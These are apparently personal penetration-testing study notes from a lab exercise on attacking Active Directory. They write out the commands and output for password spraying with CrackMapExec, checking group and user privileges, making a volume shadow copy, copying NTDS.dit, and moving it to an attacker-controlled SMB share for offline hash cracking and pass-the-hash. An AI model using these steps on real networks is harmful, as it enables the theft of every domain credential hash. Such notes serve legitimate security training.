# Attacking Active Directory & NTDS.dit

* Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`.
  * This does not mean the SAM database can no longer be used.
  * to log on using a local account in the SAM database can still do so by
    * specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01/nameofuser`)
    * or with direct access to the device then typing `./` at the logon UI in the `Username` field.

**Launching the Attack with CrackMapExec**

* [crackmapexec.md](crackmapexec.md "mention")

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

* if the admins configured an account lockout policy, this attack could lock out the account that we are targeting
* At the time of this note (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.

### Capturing NTDS.dit

* `NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources.
  * the `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html).
  * This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information

\#ev

**Checking Local Group Membership**

```shell-session
net localgroup
```

```shell-session
Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

**Checking User Account Privileges including Domain**

```shell-session
net user bwilliamson
```

```shell-session
User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

* This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

**Creating Shadow Copy of C:**

* When all the components support Volume Shadow Copy (VSS), you can use them to back up your application data without taking the applications offline
* We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD.
  * It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.

```shell-session
 vssadmin CREATE SHADOW /For=C:
```

```shell-session
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

**Copying NTDS.dit from the VSS**

```shell-session
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

* \[\[Create SMB server Linux (HACK)]]

```shell-session
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

### Crack the NT hash with hashcat

!\[\[Hashcat#Cracking the NT Hash with Hashcat]]

* What if we are unsuccessful in cracking a hash?
* use \[\[Evil-WinRM#Pass-the-Hash|Pass the Hash]]

### Pass-the-Hash Considerations

* \[\[Pass the Hash (PtH)]] !\[\[Evil-WinRM#Pass-the-Hash with Evil-WinRM Example]]
